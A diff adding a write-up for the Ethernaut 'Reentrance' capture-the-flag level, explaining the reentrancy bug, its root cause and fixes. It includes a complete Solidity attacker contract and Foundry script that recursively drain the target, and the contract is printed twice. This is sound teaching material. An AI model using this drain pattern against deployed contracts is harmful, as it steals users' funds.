@@ -1,0 +1,326 @@
+# Ethernaut Level 10 – Reentrance
+
+## Overview
+
+The objective of this challenge is to drain all Ether held by the `Reentrance` contract.
+
+The vulnerability is a classic **reentrancy attack**, caused by violating the **Checks-Effects-Interactions (CEI)** pattern. The contract transfers Ether to the caller before updating its internal accounting, allowing a malicious contract to repeatedly call `withdraw()` while its recorded balance remains unchanged.
+
+This is one of the most famous vulnerabilities in Ethereum history and was the root cause of **The DAO Hack** in 2016.
+
+---
+
+# Vulnerable Contract
+
+```solidity
+function withdraw(uint256 _amount) public {
+    if (balances[msg.sender] >= _amount) {
+        (bool result,) = msg.sender.call{value: _amount}("");
+
+        if (result) {
+            _amount;
+        }
+
+        balances[msg.sender] -= _amount;
+    }
+}
+```
+
+The withdrawal process is:
+
+1. Check the user's recorded balance.
+2. Send Ether to the caller.
+3. Update the recorded balance.
+
+The external call occurs before the balance is reduced, creating a window where the attacker regains control while their balance is still intact.
+
+---
+
+# Root Cause
+
+The contract violates the **Checks-Effects-Interactions** pattern.
+
+Current execution order:
+
+```text
+Checks
+    ↓
+Interactions ❌
+    ↓
+Effects ❌
+```
+
+Secure execution order:
+
+```text
+Checks
+    ↓
+Effects ✅
+    ↓
+Interactions ✅
+```
+
+Because the external call happens before the state update, the recipient contract can execute arbitrary code before the balance is modified.
+
+---
+
+# Understanding the Vulnerability
+
+Assume the attacker donates **1 ETH**.
+
+The contract stores:
+
+```text
+balances[attacker] = 1 ETH
+```
+
+The attacker then calls:
+
+```solidity
+withdraw(1 ether);
+```
+
+Execution proceeds as follows:
+
+```text
+Check balance
+        │
+        ▼
+1 ETH >= 1 ETH ✓
+        │
+        ▼
+Send 1 ETH to attacker
+        │
+        ▼
+Attacker's receive() executes
+```
+
+At this point, the following line has **not** executed yet:
+
+```solidity
+balances[msg.sender] -= _amount;
+```
+
+Therefore, the contract still believes the attacker owns the full deposited balance.
+
+Inside `receive()`, the attacker simply calls `withdraw()` again.
+
+Each recursive call passes the same balance check because the contract's state has not yet been updated.
+
+---
+
+# Exploit
+
+The attacker deploys a helper contract that:
+
+* Donates Ether to itself inside the target contract.
+* Initiates the first withdrawal.
+* Re-enters the vulnerable `withdraw()` function from its `receive()` callback until the target contract has no Ether remaining.
+
+```solidity
+contract HelperContract {
+    Reentrance public target;
+    uint256 public amount;
+
+    constructor(address payable targetAddress) public {
+        target = Reentrance(targetAddress);
+    }
+
+    function attack() external payable {
+        amount = msg.value;
+
+        target.donate{value: amount}(address(this));
+
+        target.withdraw(amount);
+    }
+
+    receive() external payable {
+        uint256 remaining = address(target).balance;
+
+        if (remaining > 0) {
+            uint256 toWithdraw =
+                remaining < amount
+                    ? remaining
+                    : amount;
+
+            target.withdraw(toWithdraw);
+        }
+    }
+}
+```
+
+Exploit script:
+
+```solidity
+function run() external {
+    vm.startBroadcast(PLAYER_PRIVATE_KEY);
+
+    HelperContract attacker =
+        new HelperContract(
+            payable(address(reentranceInstance))
+        );
+
+    uint256 targetBalance =
+        address(reentranceInstance).balance;
+
+    uint256 donationAmount =
+        targetBalance > 0
+            ? targetBalance
+            : 0.001 ether;
+
+    attacker.attack{value: donationAmount}();
+
+    vm.stopBroadcast();
+}
+```
+
+---
+
+# Why the Withdrawal Amount Matters
+
+A subtle but important detail is choosing the correct withdrawal amount during each reentrant call.
+
+Instead of always requesting the original donation amount, the exploit calculates:
+
+```solidity
+uint256 toWithdraw =
+    remaining < amount
+        ? remaining
+        : amount;
+```
+
+This ensures the final recursive withdrawal never requests more Ether than the contract still holds.
+
+Without this adjustment, the final withdrawal could fail once the remaining balance becomes smaller than the requested amount, preventing the contract from being fully drained.
+
+---
+
+# Attack Flow
+
+```text
+Donate Ether
+        │
+        ▼
+balances[attacker] = amount
+        │
+        ▼
+withdraw(amount)
+        │
+        ▼
+Target sends Ether
+        │
+        ▼
+receive()
+        │
+        ▼
+withdraw(amount)
+        │
+        ▼
+Target sends Ether
+        │
+        ▼
+receive()
+        │
+        ▼
+Repeat until target balance = 0
+        │
+        ▼
+Recursive calls finish
+        │
+        ▼
+Balances updated too late
+        │
+        ▼
+Challenge Solved
+```
+
+---
+
+# Security Impact
+
+Reentrancy is one of the most critical vulnerabilities in smart contract security.
+
+If exploited, an attacker may:
+
+* Drain protocol funds.
+* Bypass accounting mechanisms.
+* Manipulate internal balances.
+* Execute privileged logic multiple times before state changes take effect.
+
+The most well-known example is **The DAO Hack**, where approximately **3.6 million ETH** was drained due to this exact class of vulnerability.
+
+---
+
+# Recommended Mitigation
+
+The primary defense is following the **Checks-Effects-Interactions** pattern.
+
+Instead of:
+
+```solidity
+(bool success,) = msg.sender.call{value: amount}("");
+
+balances[msg.sender] -= amount;
+```
+
+Update the state first:
+
+```solidity
+balances[msg.sender] -= amount;
+
+(bool success,) = msg.sender.call{value: amount}("");
+require(success, "Transfer failed");
+```
+
+Additional protections include:
+
+* Using **OpenZeppelin's `ReentrancyGuard`**.
+* Applying the **Pull over Push** payment model.
+* Minimizing external calls during sensitive state transitions.
+
+---
+
+# Key Takeaways
+
+* Always update internal state before making external calls.
+* `call()` transfers control to untrusted contracts.
+* Reentrancy occurs when an attacker re-enters a function before the original execution finishes.
+* The **Checks-Effects-Interactions** pattern is one of the most important secure coding practices in Solidity.
+* `ReentrancyGuard` provides an additional layer of protection but should complement—not replace—correct contract design.
+
+---
+
+# Exploit Summary
+
+```solidity
+contract HelperContract {
+    Reentrance public target;
+    uint256 public amount;
+
+    constructor(address payable targetAddress) public {
+        target = Reentrance(targetAddress);
+    }
+
+    function attack() external payable {
+        amount = msg.value;
+
+        target.donate{value: amount}(address(this));
+        target.withdraw(amount);
+    }
+
+    receive() external payable {
+        uint256 remaining = address(target).balance;
+
+        if (remaining > 0) {
+            uint256 toWithdraw =
+                remaining < amount
+                    ? remaining
+                    : amount;
+
+            target.withdraw(toWithdraw);
+        }
+    }
+}
+```
+
+The exploit abuses a classic reentrancy vulnerability by repeatedly calling `withdraw()` from the attacker's `receive()` function before the target contract updates the attacker's recorded balance. Because the state change occurs only after the external call returns, the attacker can recursively withdraw funds until the `Reentrance` contract's Ether balance is completely drained.
